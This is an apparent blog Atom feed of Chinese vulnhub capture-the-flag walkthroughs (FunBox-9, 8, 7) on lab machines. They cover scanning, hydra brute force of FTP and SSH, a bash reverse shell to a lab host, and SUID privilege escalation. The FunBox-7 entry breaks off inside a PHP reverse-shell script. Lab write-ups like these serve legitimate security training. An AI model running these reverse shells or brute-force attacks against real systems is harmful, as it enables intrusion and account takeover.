<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MS02423</title>
  
  <subtitle>MS02423</subtitle>
  <link href="http://ms02423.top/atom.xml" rel="self"/>
  
  <link href="http://ms02423.top/"/>
  <updated>2024-05-31T13:45:57.531Z</updated>
  <id>http://ms02423.top/</id>
  
  <author>
    <name>MS02423</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub靶场之FunBox-10</title>
    <link href="http://ms02423.top/2024/05/31/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-10/"/>
    <id>http://ms02423.top/2024/05/31/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-10/</id>
    <published>2024-05-31T13:45:57.000Z</published>
    <updated>2024-05-31T13:45:57.531Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之FunBox-9</title>
    <link href="http://ms02423.top/2024/05/26/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-9/"/>
    <id>http://ms02423.top/2024/05/26/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-9/</id>
    <published>2024-05-26T11:37:14.000Z</published>
    <updated>2024-05-31T13:42:28.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">It's a box <span class="token keyword">for</span> beginners<span class="token punctuation">,</span> but <span class="token operator">not</span> easy<span class="token punctuation">.</span> Gather careful !!!Hint<span class="token punctuation">:</span>Don't waste your <span class="token keyword">time</span> ! <span class="token keyword">Every</span> BruteForce-Attack <span class="token keyword">at</span> <span class="token keyword">all</span> ports can be stopped <span class="token keyword">after</span> <span class="token number">1500</span> trys per account<span class="token punctuation">.</span>Enjoy the game <span class="token operator">and</span> WYSIWYG ! This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><p><a href="https://www.vulnhub.com/entry/funbox-gaokao,707/">https://www.vulnhub.com/entry/funbox-gaokao,707/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526205715706.png" alt="image-20240526205715706"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526205755099.png" alt="image-20240526205755099"></p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实IP地址"><a href="#1-寻找靶场真实IP地址" class="headerlink" title="1.寻找靶场真实IP地址"></a>1.寻找靶场真实IP地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526210027543.png" alt="image-20240526210027543"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526210108854.png" alt="image-20240526210108854"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">通过上面两个命令我们知道靶场真实IP地址为192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526210433043.png" alt="image-20240526210433043"></p><pre class="line-numbers language-none"><code class="language-none">开启了21端口，服务为ftp开启了22端口，服务为ssh开启了80端口，服务为apache2开启了3306端口，服务为mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><p><a href="http://192.168.2.9/">http://192.168.2.9</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526211101872.png" alt="image-20240526211101872"></p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描"><a href="#1-nikto扫描" class="headerlink" title="1)nikto扫描"></a>1)nikto扫描</h3><pre class="line-numbers language-none"><code class="language-none">nikto -h http:&#x2F;&#x2F;192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212518825.png" alt="image-20240526212518825"></p><h3 id="2-dirsearch扫描"><a href="#2-dirsearch扫描" class="headerlink" title="2)dirsearch扫描"></a>2)dirsearch扫描</h3><pre class="line-numbers language-none"><code class="language-none">dirsearch -u http:&#x2F;&#x2F;192.168.2.9 -e * -x 403 --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212428558.png" alt="image-20240526212428558"></p><h3 id="3-dirb扫描"><a href="#3-dirb扫描" class="headerlink" title="3)dirb扫描"></a>3)dirb扫描</h3><pre class="line-numbers language-none"><code class="language-none">dirb http:&#x2F;&#x2F;192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212401279.png" alt="image-20240526212401279"></p><h3 id="4-gobuster扫描"><a href="#4-gobuster扫描" class="headerlink" title="4)gobuster扫描"></a>4)gobuster扫描</h3><pre class="line-numbers language-none"><code class="language-none">gobuster dir -u http:&#x2F;&#x2F;192.168.2.9 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x php.txt.html,zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212325048.png" alt="image-20240526212325048"></p><p>都没有扫描到任何有用的信息，我们知道开启了21端口，我们查看ftp服务</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-ftp服务"><a href="#1-ftp服务" class="headerlink" title="1)ftp服务"></a>1)ftp服务</h3><pre class="line-numbers language-ftp" data-language="ftp"><code class="language-ftp">ftp 192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212731390.png" alt="image-20240526212731390"></p><p>我们可以看到一个文件，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212916428.png" alt="image-20240526212916428"></p><p>sky@%L，我们可以看到用户名是sky,密码我们进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> sky <span class="token parameter variable">-P</span>  /usr/share/wordlists/rockyou.txt  <span class="token function">ftp</span> <span class="token number">192.168</span>.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526213515192.png" alt="image-20240526213515192"></p><p>我们看到密码是thebest,我们进行登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ftp</span> <span class="token number">192.168</span>.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526213608449.png" alt="image-20240526213608449"></p><p>我们可以看到登录成功，根目录有一个文件，我们进行查看</p><h3 id="2-反弹shell"><a href="#2-反弹shell" class="headerlink" title="2)反弹shell"></a>2)反弹shell</h3><p>我们查看user.flag文件，可以看到是一个脚本，我们修改它，让它反弹shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526214053917.png" alt="image-20240526214053917"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/192.168.2.8/6666 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240531213602418.png" alt="image-20240531213602418"></p><p>我们可以看到反弹成功，我们进行提权</p><h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3)提权"></a>3)提权</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null     <span class="token comment"># 查看提权方式</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240531213702464.png" alt="image-20240531213702464"></p><p>我们可以看到bash提权，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240531213835883.png" alt="image-20240531213835883"></p><p>我们可以看到提权方式是bash -p</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240531213905156.png" alt="image-20240531213905156"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240531214100392.png" alt="image-20240531214100392"></p><p>到这里，渗透测试结束</p><p>这里我们只要掌握ftp爆破和hydra爆破即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之FunBox-8</title>
    <link href="http://ms02423.top/2024/05/18/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-8/"/>
    <id>http://ms02423.top/2024/05/18/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-8/</id>
    <published>2024-05-18T11:46:43.000Z</published>
    <updated>2024-05-26T11:35:34.404Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">It's a box <span class="token keyword">for</span> beginners <span class="token operator">and</span> can be pwned <span class="token keyword">in</span> the lunch break<span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><p><a href="https://www.vulnhub.com/entry/funbox-lunchbreaker,700/">https://www.vulnhub.com/entry/funbox-lunchbreaker,700/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518195135434.png" alt="image-20240518195135434"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518195206600.png" alt="image-20240518195206600"></p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实IP地址"><a href="#1-寻找靶场真实IP地址" class="headerlink" title="1.寻找靶场真实IP地址"></a>1.寻找靶场真实IP地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518195724254.png" alt="image-20240518195724254"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518195753344.png" alt="image-20240518195753344"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">靶场真实IP地址为192.168.2.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.2.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518200221973.png" alt="image-20240518200221973"></p><pre class="line-numbers language-none"><code class="language-none">开启了21端口，服务为ftp开启了22端口，服务为ssh开启了80端口，服务为apache2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><p><a href="http://192.168.2.12/">http://192.168.2.12</a></p><p>我们可以看到是一幅画，查看源代码发现，需要域名绑定</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518195820099.png" alt="image-20240518195820099"></p><p>我们进行域名绑定</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518200539523.png" alt="image-20240518200539523"></p><p>这里由于种种原因，IP地址变成了192.168.2.7</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> htpp://192.168.2.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518212336341.png" alt="image-20240518212336341"></p><p>扫描出了一个robots.txt</p><p>我们进行查看 </p><p><a href="http://192.168.2.7/robots.txt">http://192.168.2.7/robots.txt</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518212442129.png" alt="image-20240518212442129"></p><p>可以看到不允许扫描的方式:dirb.gobuster,那么接下来的扫描就没有任何意义了</p><p>我们想到开启了21端口，我们进行查看</p><h2 id="3-查看21端口"><a href="#3-查看21端口" class="headerlink" title="3.查看21端口"></a>3.查看21端口</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518212813313.png" alt="image-20240518212813313"></p><p>我们可以看到2个文件，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518212833167.png" alt="image-20240518212833167"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518212930320.png" alt="image-20240518212930320"></p><p>但是这些还是没有用</p><p>我们换一个思路进行渗透，我们想到前面的源代码</p><p>猜测可能存在 jane、miller、j.miller等用户而且主机名也显示了 ：funbox8.ctf添加到 hosts文件中访问</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518213136923.png" alt="image-20240518213136923"></p><h2 id="4-渗透测试"><a href="#4-渗透测试" class="headerlink" title="4.渗透测试"></a>4.渗透测试</h2><h3 id="1-ftp爆破"><a href="#1-ftp爆破" class="headerlink" title="1)ftp爆破"></a>1)ftp爆破</h3><p>我们首先把用户名放到一个文件里面，然后进行爆破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518213310948.png" alt="image-20240518213310948"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> <span class="token string">'/home/kali/桌面/users.txt'</span>  <span class="token parameter variable">-P</span> rockyou.txt  funbox8.ctf  <span class="token function">ftp</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518213438862.png" alt="image-20240518213438862"></p><p>爆破出来用户名是jane,密码是password</p><h3 id="2-ftp登录"><a href="#2-ftp登录" class="headerlink" title="2)ftp登录"></a>2)ftp登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ftp</span> <span class="token number">192.168</span>.2.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到一个keys.txt文件，但是没有什么用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518214459706.png" alt="image-20240518214459706"></p><p>我们查看根目录有&#x2F;home，我们进行查看,可以看到4个用户名，我们再次进行ftp爆破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518214820220.png" alt="image-20240518214820220"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> user1.txt <span class="token parameter variable">-P</span> /usr/share/wordlists/rockyou.txt  <span class="token number">192.168</span>.2.7 <span class="token function">ftp</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>爆出用户<code>jim</code>的密码 <code>12345</code>,<code>FTP</code> 登录</strong> <strong>后面又爆破出了 <code>jules</code> 用户密码：<code>sexylady</code></strong></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518215345314.png" alt="image-20240518215345314"></p><p>jim用户名没有什么用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518215509135.png" alt="image-20240518215509135"></p><p>我们查看jules用户名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518220436415.png" alt="image-20240518220436415"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518220630924.png" alt="image-20240518220630924"></p><p>我们发现了密码，我们进行下载,我们进行爆破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518221636113.png" alt="image-20240518221636113"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518221652402.png" alt="image-20240518221652402"></p><h3 id="3-ssh登录"><a href="#3-ssh登录" class="headerlink" title="3)ssh登录"></a>3)ssh登录</h3><p>因为4个用户名，只有john没有爆破出来密码，所以我们进行ssh爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> john <span class="token parameter variable">-P</span> .bad-passwds funbox8.ctf <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518222019149.png" alt="image-20240518222019149"></p><p>爆破出来用户名是johh,密码是zhnmju!!!</p><p>我们进行ssh登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> john@192.168.2.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518222212271.png" alt="image-20240518222212271"></p><p>我们可以看到登录成功</p><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4)提权"></a>4)提权</h3><p>sudo -l</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518222328921.png" alt="image-20240518222328921"></p><p>我们可以看到不行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null   <span class="token comment">##没有利用的</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518222440480.png" alt="image-20240518222440480"></p><p>还是没有</p><p>我们查看根目录，<strong>发现了一个<code>.todo</code>目录进去 得知 <code>todo.list</code> 说明<code>root</code>的密码其他的一样 <code>su root </code>查看<code>root.flag</code> 即可。</strong></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518222701407.png" alt="image-20240518222701407"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240518222723525.png" alt="image-20240518222723525"></p><p>渗透测试结束</p><p>这个靶场的重点就是ftp，ssh爆破，使用hydra即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之FunBox-7</title>
    <link href="http://ms02423.top/2024/05/15/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-7/"/>
    <id>http://ms02423.top/2024/05/15/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-7/</id>
    <published>2024-05-15T13:04:28.000Z</published>
    <updated>2024-05-16T14:35:56.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Boot2root <span class="token keyword">in</span> <span class="token number">6</span> steps <span class="token keyword">for</span> script-kiddies<span class="token punctuation">.</span>Timeframe <span class="token keyword">to</span> root this box<span class="token punctuation">:</span> <span class="token number">20</span> mins <span class="token keyword">to</span> never ever<span class="token punctuation">.</span> It's <span class="token keyword">on</span> you<span class="token punctuation">.</span>HINTS<span class="token punctuation">:</span>Enum without sense<span class="token punctuation">,</span> costs you too many <span class="token keyword">time</span><span class="token punctuation">:</span><span class="token keyword">Use</span> <span class="token string">"Daisys best friend"</span> <span class="token keyword">for</span> information gathering<span class="token punctuation">.</span>Visit <span class="token string">"Karla at home"</span><span class="token punctuation">.</span>John <span class="token operator">and</span> Hydra loves only rockyou<span class="token punctuation">.</span>txtEnum<span class="token operator">/</span>reduce the users <span class="token keyword">to</span> brute force <span class="token keyword">with</span> <span class="token operator">or</span> brute force the rest <span class="token keyword">of</span> your life<span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目提到了hydra和rockyou.txt,可以看到暴力破解</p><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/funbox-easyenum,565/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516211254768.png" alt="image-20240516211254768"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516211333637.png" alt="image-20240516211333637"></p><p>靶场IP地址我们不知道，但是我们知道网段是192.168.2.0&#x2F;24</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实IP地址"><a href="#1-寻找靶场真实IP地址" class="headerlink" title="1.寻找靶场真实IP地址"></a>1.寻找靶场真实IP地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516212718007.png" alt="image-20240516212718007"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516212759055.png" alt="image-20240516212759055"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">靶场真实IP地址为192.168.2.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-none"><code class="language-none">nmap -p- -sV 192.168.2.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516213021305.png" alt="image-20240516213021305"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">开放了80端口和22端口<span class="token number">80</span>端口为apache2服务<span class="token number">22</span>端口为ssh服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里可以想到ssh登录</p><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><p><a href="http://192.168.2.7/">http://192.168.2.7</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516213127712.png" alt="image-20240516213127712"></p><p>发现是一个apache2页面</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描"><a href="#1-nikto扫描" class="headerlink" title="1)nikto扫描"></a>1)nikto扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.2.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516213415942.png" alt="image-20240516213415942"></p><p>扫描到一个robots.txt页面和&#x2F;phpmyadmin登录页面</p><p>但是都没有什么用</p><h3 id="2-dirsearch扫描"><a href="#2-dirsearch扫描" class="headerlink" title="2)dirsearch扫描"></a>2)dirsearch扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> http://192.168.2.7 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516213740423.png" alt="image-20240516213740423"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.2.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516214105961.png" alt="image-20240516214105961"></p><p>都没有扫描到有用的信息，我们换一个字典进行扫描</p><h3 id="3-gobuster扫描"><a href="#3-gobuster扫描" class="headerlink" title="3)gobuster扫描"></a>3)gobuster扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.2.7 <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="token parameter variable">-x</span> php,zip,txt,html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516214012497.png" alt="image-20240516214012497"></p><p>我们可以看到多了一个&#x2F;mini.php页面，我们进行访问</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问mini-php页面"><a href="#1-访问mini-php页面" class="headerlink" title="1)访问mini.php页面"></a>1)访问mini.php页面</h3><p><a href="http://192.168.2.7/mini.php">http://192.168.2.7/mini.php</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516214331651.png" alt="image-20240516214331651"></p><p>我们可以看到有文件上传的地方,但是这里直接上传一句话木马是没有作用的，这里我们修改mini.php文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516214548307.png" alt="image-20240516214548307"></p><h3 id="2-修改文件内容"><a href="#2-修改文件内容" class="headerlink" title="2)修改文件内容"></a>2)修改文件内容</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpset_time_limit <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string">"1.0"</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token 